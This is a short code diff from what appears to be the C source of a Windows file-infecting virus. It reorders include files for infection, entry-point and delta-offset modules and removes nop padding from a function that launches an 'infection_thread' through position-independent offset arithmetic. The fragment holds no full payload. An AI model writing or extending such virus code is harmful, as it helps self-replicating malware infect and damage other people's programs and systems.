@@ -6,20 +6,18 @@
 #include "checksum_list.h"
 #include "code_begin.h"
 #include "code_end.h"
+#include "delta.h"
 #include "function_kernel32.h"
 #include "infect.h"
 #include "infection_thread.h"
+#include "memory.h"
 #include "oep.h"
 #include "string_generator.h"
 #include "utility.h"
-#include "delta.h"
-#include "memory.h"
 
 // static DWORD WINAPI infection_thread(LPVOID param);
 
 void spawn_infection_thread(void) {
-    asm volatile("nop\nnop\nnop");
-
     HANDLE thread = CREATE_THREAD(NULL, 0,
                                   (LPTHREAD_START_ROUTINE)BYTE_OFFSET(
                                       infection_thread, get_delta_offset()),
